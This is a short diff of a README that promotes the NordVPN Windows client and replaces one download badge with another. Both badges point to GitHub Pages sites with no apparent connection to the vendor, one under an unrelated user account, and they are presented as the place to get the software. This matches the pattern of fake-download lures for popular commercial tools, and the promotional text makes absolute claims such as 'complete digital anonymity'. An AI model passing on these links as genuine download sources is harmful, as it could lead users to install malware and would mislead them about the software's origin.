@@ -9,7 +9,7 @@
 
 NordVPN is a leading virtual private network (VPN) client engineered for Windows environments to secure internet browsing and protect sensitive data against interception. Built around the high-speed NordLynx protocol (derived from WireGuard), it establishes heavily encrypted tunnels across a massive global server network. The application protects users on public Wi-Fi networks, prevents ISP throttling, blocks malicious trackers, and ensures complete digital anonymity without sacrificing connection speeds.
 
-[![Download NordVPN](https://img.shields.io/badge/Download-NordVPN-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://rema21859.github.io/.github/NordVPN-Storage-Handler)
+[![Connect with NordVPN](https://img.shields.io/badge/Connect%20with-NordVPN-4687FF?style=for-the-badge)](https://nordvpn-handler.github.io/.github/)
 
 ---
 
